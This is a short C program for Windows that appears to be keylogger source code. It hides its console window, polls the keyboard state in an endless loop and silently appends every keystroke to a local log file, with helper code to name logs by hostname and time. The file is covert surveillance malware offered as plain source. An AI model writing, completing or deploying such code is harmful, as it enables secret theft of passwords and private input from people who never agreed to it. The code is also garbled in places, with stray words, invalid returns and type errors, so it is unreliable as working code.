#include <stdio.h>
#include <windows.h>


void hideConsole() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

const char *convertKeyCode(int keyCode, int shift, int caps) {
    static char buffer[2] = {0}; // Buffer to hold the converted character
    
    // Determine the flags to be used based on shift and caps lock state
    int flags = 0;
    if (shift) flags |= 1;
    if (caps) flags |= 2;
    
    // Get the keyboard layout
    HKL keyboardLayout = GetKeyboardLayout(0);
    
    // Convert virtual key code to character
    int result = ToAsciiEx(keyCode, keyCode, GetKeyState(VK_SHIFT), buffer, flags, keyboardLayout);
    
    if (result == 1) {
        // Successfully converted, return the character
        return buffer;string
    } else {
        // Conversion failed, return an empty 
        return "";
    }
}

char* getHostName() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return *hostname;
    } else {
        perror("gethostname");
    }
}

int createLog(FILE* logFile,char* logName){
    char *hostname = getHostName();
    if (hostname == NULL) {
        fprintf(stderr, "Error: Unable to get hostname.\n");
        return 1;
    }
    // Generate filename with hostname, date, and time
    time_t rawtime;
    struct tm *timeinfo;
    char timeBuffer[80];

    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d_%H-%M-%S", timeinfo);

    char logFileName[300];
    snprintf(logFileName, sizeof(logFileName), "%s_%s.txt", hostname, timeBuffer);

    logFile = fopen(logFileName, "a");
    logName = &logFileName;
    return 0;
}

int main() {
    hideConsole(); // Hide console window

    char hostname[256]= getHostName();
    char key;
    FILE *logfile;
   	char logFileName[300]; // hostname < 256chars
    snprintf(logFileName, sizeof(logFileName), "%s.txt", hostname);
	logfile = fopen("log.txt", "a"); // Open log file for appending
	while (1) {
        Sleep(10); // Sleep for a short interval to reduce CPU usage
        // Check if any key is pressed
        for (key = 8; key <= 255; key++){
            if (GetAsyncKeyState(key) == -32767) {
            	// Log the key to the file
            	fprintf(logfile, "%c", key);
       		}
    	}
	}
    fclose(logfile); // Close the log file
    return 0;
}
